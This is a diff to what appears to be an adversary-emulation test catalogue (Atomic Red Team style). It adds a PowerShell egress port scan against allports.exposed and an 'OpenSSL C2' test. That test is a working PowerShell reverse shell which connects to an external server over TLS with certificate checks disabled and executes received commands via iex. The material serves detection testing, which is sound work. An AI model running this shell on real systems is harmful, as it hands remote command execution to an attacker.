@@ -18906,11 +18906,43 @@ discovery:
       executor:
         name: command_prompt
         elevation_required: false
-        command: |-
+        command: |
           ipconfig /all
           net config workstation
           net view /all /domain
           nltest /domain_trusts
+    - name: List Open Egress Ports
+      description: |
+        This is to test for what ports are open outbound.  The technique used was taken from the following blog:
+        https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/
+      supported_platforms:
+      - windows
+      input_arguments:
+        port_file:
+          description: The path to a text file containing ports to be scanned, one
+            port per line. The default list uses the top 128 ports as defined by Nmap.
+          type: Path
+          default: PathToAtomicsFolder\T1016\src\top-128.txt
+        output_file:
+          description: Path of file to write port scan results
+          type: Path
+          default: "$env:USERPROFILE\\Desktop\\open-ports.txt"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen
+          = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n
+          \   $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\",
+          $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n
+          \   $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result
+          = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result
+          | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n
+          \   }\n    else {\n        $result = \"$port closed\" \n        Write-Host
+          -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result
+          | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were
+          a total of $totalopen open ports out of $totalports ports tested.\"\n$results
+          | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n"
+        cleanup_command: Remove-Item -ErrorAction ignore "#{output_file}"
   T1049:
     technique:
       x_mitre_permissions_required:
@@ -28071,6 +28103,103 @@ command-and-control:
         command: |
           Set-Location $PathToAtomicsFolder
           .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+  T1032:
+    technique:
+      x_mitre_data_sources:
+      - Packet capture
+      - Netflow/Enclave netflow
+      - Malware reverse engineering
+      - Process use of network
+      - Process monitoring
+      - SSL/TLS inspection
+      name: Standard Cryptographic Protocol
+      description: Adversaries may explicitly employ a known encryption algorithm
+        to conceal command and control traffic rather than relying on any inherent
+        protections provided by a communication protocol. Despite the use of a secure
+        algorithm, these implementations may be vulnerable to reverse engineering
+        if necessary secret keys are encoded and/or generated within malware samples/configuration
+        files.
+      id: attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)
+
+        If malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)
+
+        In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_network_requirements: true
+      created: '2017-05-31T21:30:35.334Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - external_id: T1032
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1032
+      - source_name: SANS Decrypting SSL
+        description: Butler, M. (2013, November). Finding Hidden Threats by Decrypting
+          SSL. Retrieved April 5, 2016.
+        url: http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840
+      - source_name: SEI SSL Inspection Risks
+        description: Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved
+          April 5, 2016.
+        url: https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html
+      - source_name: Fidelis DarkComet
+        description: Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for
+          a DarkComet. Retrieved April 5, 2016.
+        url: https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf
+      - source_name: University of Birmingham C2
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      modified: '2019-07-19T18:55:09.403Z'
+      identifier: T1032
+    atomic_tests:
+    - name: OpenSSL C2
+      description: |
+        Thanks to @OrOneEqualsOne for this quick C2 method.
+        This is to test to see if a C2 session can be established using an SSL socket.
+        More information about this technique, including how to set up the listener, can be found here:
+        https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926
+      supported_platforms:
+      - windows
+      input_arguments:
+        server_ip:
+          description: IP of the external server
+          type: String
+          default: 127.0.0.1
+        server_port:
+          description: The port to connect to on the external server
+          type: String
+          default: 443
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $server_ip = #{server_ip}
+          $server_port = #{server_port}
+          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})
+          $stream = $socket.GetStream()
+          $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+          $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
+          $writer = new-object System.IO.StreamWriter($sslStream)
+          $writer.Write('PS ' + (pwd).Path + '> ')
+          $writer.flush()
+          [byte[]]$bytes = 0..65535|%{0};
+          while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
+          {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+          $sendback = (iex $data | Out-String ) 2>&1;
+          $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+          $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+          $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
   T1065:
     technique:
       x_mitre_data_sources:
